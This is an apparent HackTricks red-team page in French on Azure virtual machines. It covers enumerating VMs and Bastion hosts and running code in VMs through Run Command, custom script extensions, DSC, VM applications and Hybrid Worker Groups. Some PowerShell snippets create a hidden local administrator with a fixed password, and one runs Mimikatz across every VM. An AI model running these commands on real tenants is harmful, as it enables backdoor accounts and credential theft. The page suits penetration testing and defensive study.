# Az - Machines Virtuelles & R√©seau

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../../../../.gitbook/assets/image (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../../.gitbook/assets/image (1).png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** üí¨ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## Informations de base

[From the docs:](https://learn.microsoft.com/en-us/azure/virtual-machines/overview) Les machines virtuelles Azure sont l'un des plusieurs types de [ressources informatiques √† la demande et √©volutives](https://learn.microsoft.com/en-us/azure/architecture/guide/technology-choices/compute-decision-tree) que propose Azure. En g√©n√©ral, vous choisissez une machine virtuelle lorsque vous avez besoin de plus de contr√¥le sur l'environnement informatique que les autres options ne le permettent. Cet article vous fournit des informations sur ce que vous devez consid√©rer avant de cr√©er une machine virtuelle, comment vous la cr√©ez et comment vous la g√©rez.

## Informations sur le r√©seau Azure

Les r√©seaux Azure contiennent **diff√©rentes entit√©s et fa√ßons de le configurer.** Vous pouvez trouver une br√®ve **description,** **exemples** et **commandes d'√©num√©ration** des diff√©rentes entit√©s r√©seau Azure dans :

{% content-ref url="az-azure-network.md" %}
[az-azure-network.md](az-azure-network.md)
{% endcontent-ref %}

## Azure Bastion

**Azure Bastion** offre une solution d'acc√®s RDP (Remote Desktop Protocol) et SSH (Secure Shell) s√©curis√©e et enti√®rement g√©r√©e via SSL √† travers le portail Azure. Il est int√©gr√© dans un r√©seau virtuel Azure, permettant la connectivit√© RDP et SSH aux machines virtuelles en utilisant des IP priv√©es, √©vitant ainsi le besoin d'IP publiques. Cela en fait une alternative plus s√ªre et plus pratique aux m√©thodes traditionnelles impliquant des attributions d'IP publiques et des configurations de r√®gles NSG pour l'acc√®s aux machines virtuelles. Les d√©veloppeurs et le personnel informatique peuvent acc√©der en toute s√©curit√© aux machines virtuelles depuis le portail Azure en utilisant leurs navigateurs web, simplifiant ainsi le processus pour les environnements de d√©veloppement et de test.

Pour lister tous les h√¥tes Azure Bastion dans votre abonnement, vous pouvez utiliser la commande suivante :

{% code overflow="wrap" %}
```bash
az network bastion list --query "[].{name:name, resourceGroup:resourceGrou, location:location}" -o table
```
{% endcode %}

## √ânum√©ration des VM
```powershell
# Get readable VMs
Get-AzVM | fl
# Lis running VMs
Get-AzureRmVM -status | where {$_.PowerState -EQ "VM running"} | select ResourceGroupName,Name
Get-AzVM -Name <name> -ResourceGroupName <res_group_name> | fl *
Get-AzVM -Name <name> -ResourceGroupName <res_group_name> | select -ExpandProperty NetworkProfile

# Get iface and IP address
Get-AzNetworkInterface -Name <interface_name>
Get-AzPublicIpAddress -Name <iface_public_ip_id>

#Get installed extensions
Get-AzVMExtension -ResourceGroupName <res_group_name> -VMName <name>

Get-AzVM | select -ExpandProperty NetworkProfile # Get name of network connector of VM
Get-AzNetworkInterface -Name <name> # Get info of network connector (like IP)
```
## **Ex√©cuter des commandes dans une VM**

### **Connexion AAD dans VM**

Il est possible de permettre l'acc√®s aux utilisateurs authentifi√©s via AzureAD. Par exemple, en essayant d'acc√©der √† une **linux VM** : `ssh username@azure-corp.com@1.1.1.1` (il est important d'**utiliser l'email** avec le azurecorp utilis√© lors de la tentative de connexion) vous pourriez obtenir une erreur comme : 

{% code overflow="wrap" %}
```
(username@azure-corp.com@1.1.1.1) This preview capability is not for production use. When you sign in, verify the name of the app on the sign-in screen is "Azure Linux VM Sign-in" and the IP address of the target VM is correct.

To sign in, use a web browser to open the page https://microsoft.com/devicelogin and enter the code DT4PNSTGR to authenticate. Press ENTER when ready.
```
{% endcode %}

Il suffit de **suivre ces instructions** en allant sur [https://microsoft.com/devicelogin](https://microsoft.com/devicelogin) et en indiquant le code, utilisez l'email et le mot de passe comme identifiants et vous pourrez vous connecter via SSH (si cet utilisateur a suffisamment de permissions pour le faire : r√¥le `Virtual Machine Administrator Login` ou `Virtual Machine User Login`).

### **Ex√©cuter la commande**
```powershell
# The permission allowing this is Microsoft.Compute/virtualMachines/runCommand/action
Invoke-AzVMRunCommand -ScriptPath .\adduser.ps1 -CommandId 'RunPowerShellScript' -VMName 'juastavm' -ResourceGroupName 'Research' ‚ÄìVerbose
## Another way
Invoke-AzureRmVMRunCommand -ScriptPath .\adduser.ps1 -CommandId 'RunPowerShellScript' -VMName 'juastavm' -ResourceGroupName 'Research' ‚ÄìVerbose

# Content of the script
$passwd = ConvertTo-SecureString "Welcome2022!" -AsPlainText -Force
New-LocalUser -Name new_user -Password $passwd
Add-LocalGroupMember -Group Administrators -Member new_user
```

```powershell
# Try to run in every machine
Import-module MicroBurst.psm1
Invoke-AzureRmVMBulkCMD -Script Mimikatz.ps1 -Verbose -output Output.txt
```
### **Ex√©cuter l'extension de script personnalis√©**

Les extensions de machine virtuelle (VM) Azure sont **de petites applications** qui fournissent des configurations et des **t√¢ches** d'automatisation apr√®s le d√©ploiement sur **les VM Azure**. Par exemple, si une machine virtuelle n√©cessite l'installation de logiciels, une protection antivirus ou la capacit√© d'ex√©cuter un script √† l'int√©rieur, vous pouvez utiliser une extension de VM.

Par cons√©quent, si vous avez acc√®s pour l'√©crire, vous pouvez ex√©cuter du code arbitraire :
```powershell
# Microsoft.Compute/virtualMachines/extensions/write
Set-AzVMExtension -ResourceGroupName "Research" -ExtensionName "ExecCmd" -VMName "infradminsrv" -Location "Germany West Central" -Publisher Microsoft.Compute -ExtensionType CustomScriptExtension -TypeHandlerVersion 1.8 -SettingString '{"commandToExecute":"powershell net users new_user Welcome2022. /add /Y; net localgroup administrators new_user /add"}'
```
### DesiredConfigurationState (DSC)

DesiredConfigurationState (DSC) est un outil PowerShell similaire √† Ansible, utilis√© pour configurer un h√¥te par le biais de code. DSC s'int√®gre √† Azure, permettant le t√©l√©chargement de fichiers de configuration sp√©cifiques. Ces fichiers doivent respecter une syntaxe stricte. Notamment, l'extension DSC dans Azure peut ex√©cuter des commandes √† partir de fichiers qui r√©pondent √† certains crit√®res de formatage, m√™me si la syntaxe n'est pas correcte selon les normes DSC, comme le montre la figure fournie.

L'ex√©cution de ces commandes est facilit√©e par la fonction [**`Publish-AzVMDscConfiguration`**](https://docs.microsoft.com/en-us/powershell/module/az.compute/publish-azvmdscconfiguration?view=azps-7.5.0) dans Az PowerShell. Les exigences incluent un fichier **.PS1** avec une fonction d√©finie et le fichier doit √™tre compress√© dans un fichier **.zip**. M√™me si la syntaxe peut ne pas √™tre pr√©cise pour DSC, le code s'ex√©cutera toujours. Cependant, l'extension marquera l'√©tat d'ex√©cution comme "√©chec", et aucune sortie de la commande ne sera visible en raison du statut √©tant √©cras√© par le message d'√©chec.

### VM Application Definitions

Les d√©finitions d'application VM permettent le d√©ploiement r√©p√©table d'applications versionn√©es sur une VM Azure. Cette ressource prend en charge le d√©ploiement et la mise √† jour d'applications sur plusieurs VMs. Pour configurer cela, plusieurs √©tapes sont n√©cessaires, impliquant des commandes comme **`New-AzGalleryApplication`** et **`New-AzGalleryApplicationVersion`** dans Az PowerShell.

L'ex√©cution d'applications ou de commandes par cette m√©thode implique le **"VMAppExtension"**, qui est install√© automatiquement lorsqu'une application est appliqu√©e √† une VM. L'extension r√©cup√®re le fichier √† partir de l'URI sp√©cifi√© et le nomme exactement comme l'application, sans extension. Pour ex√©cuter correctement le fichier, le champ "ManageActions" dans l'appel API REST doit √™tre configur√© pour renommer le fichier avec l'extension appropri√©e. La configuration de cette m√©thode, une fois termin√©e, ressemblera √† la structure montr√©e dans la figure fournie.

Cependant, cette m√©thode d'ex√©cution est relativement lente, prenant environ 3-4 minutes pour ex√©cuter une application ou une commande. Les fichiers li√©s √† ce processus sont stock√©s dans des r√©pertoires sp√©cifiques (`C:\Packages\Plugins\Microsoft.CPlat.Core.VMApplicationManagerWindows\1.0.4\Downloads\` pour la copie de l'application et `C:\Packages\Plugins\Microsoft.CPlat.Core.VMApplicationManagerWindows\1.0.4\Status\` pour l'√©tat d'ex√©cution).

Les deux techniques offrent des moyens uniques d'ex√©cuter des commandes et de d√©ployer des applications dans des environnements Azure, chacune avec son propre ensemble d'exigences, d'√©tapes et de consid√©rations.

### Hybrid Worker Groups (HWGs) in Azure

[**Hybrid Worker Groups (HWGs)**](https://docs.microsoft.com/en-us/azure/automation/automation-hybrid-runbook-worker) sont une fonctionnalit√© d'Azure qui permet aux Runbooks, configur√©s dans un compte d'automatisation, d'√™tre ex√©cut√©s sur une machine virtuelle Azure (VM) qui fait partie du HWG d√©sign√©. Cette ex√©cution est facilit√©e par une extension install√©e sur la VM, qui d√©ploie le code du Runbook sur la VM. Un aspect significatif de ce processus est que les v√©ritables identifiants ne sont pas un facteur dans l'ex√©cution car le code s'ex√©cute avec des privil√®ges √©lev√©s, sp√©cifiquement en tant que **SYSTEM** ou root, comme illustr√© dans la figure fournie.

Un d√©tail crucial pour ceux utilisant des VMs Windows 10 est la n√©cessit√© de sp√©cifier la version de PowerShell pour le Runbook. Elle doit √™tre configur√©e pour s'ex√©cuter en tant que PowerShell Version 5.1 au lieu de 7.1. Cette exigence d√©coule du fait que PowerShell 7.1 n'est pas install√© par d√©faut sur ces VMs, entra√Ænant un √©chec de l'ex√©cution du script si la version 7.1 est sp√©cifi√©e.

Cette fonctionnalit√© d'Azure offre une m√©thode robuste pour automatiser et g√©rer des t√¢ches √† travers des environnements hybrides, permettant une gestion et une ex√©cution centralis√©es des t√¢ches sur les VMs Azure.

## References

* [https://learn.microsoft.com/en-us/azure/virtual-machines/overview](https://learn.microsoft.com/en-us/azure/virtual-machines/overview)
* [https://hausec.com/2022/05/04/azure-virtual-machine-execution-techniques/](https://hausec.com/2022/05/04/azure-virtual-machine-execution-techniques/)

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../../../../.gitbook/assets/image (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../../.gitbook/assets/image (1).png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** üí¨ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
